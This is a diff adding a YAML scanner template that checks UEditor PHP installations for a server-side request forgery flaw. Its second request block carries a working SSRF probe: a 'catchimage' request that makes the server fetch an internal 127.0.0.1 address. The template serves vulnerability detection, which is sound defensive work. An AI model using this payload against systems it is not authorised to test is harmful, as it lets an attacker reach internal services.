@@ -1,0 +1,45 @@
+id: poc-yaml-ueditor-php-ssrf
+info:
+  name: UEditor PHP SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+  description: |
+    Detects SSRF vulnerability in UEditor PHP implementations that improperly handle image catching functionality.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ueditor/php/controller.php"
+      - "{{BaseURL}}/Public/ueditor/php/controller.php"
+      - "{{BaseURL}}/js/ueditor/php/controller.php"
+      - "{{BaseURL}}/module/ueditor/php/controller.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{\"state\":\"\u8bf7\u6c42\u5730\u5740\u51fa\u9519\"}"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png"
+      - "{{BaseURL}}/Public/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png"
+      - "{{BaseURL}}/js/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png"
+      - "{{BaseURL}}/module/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\u94fe\u63a5\u4e0d\u53ef\u7528"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
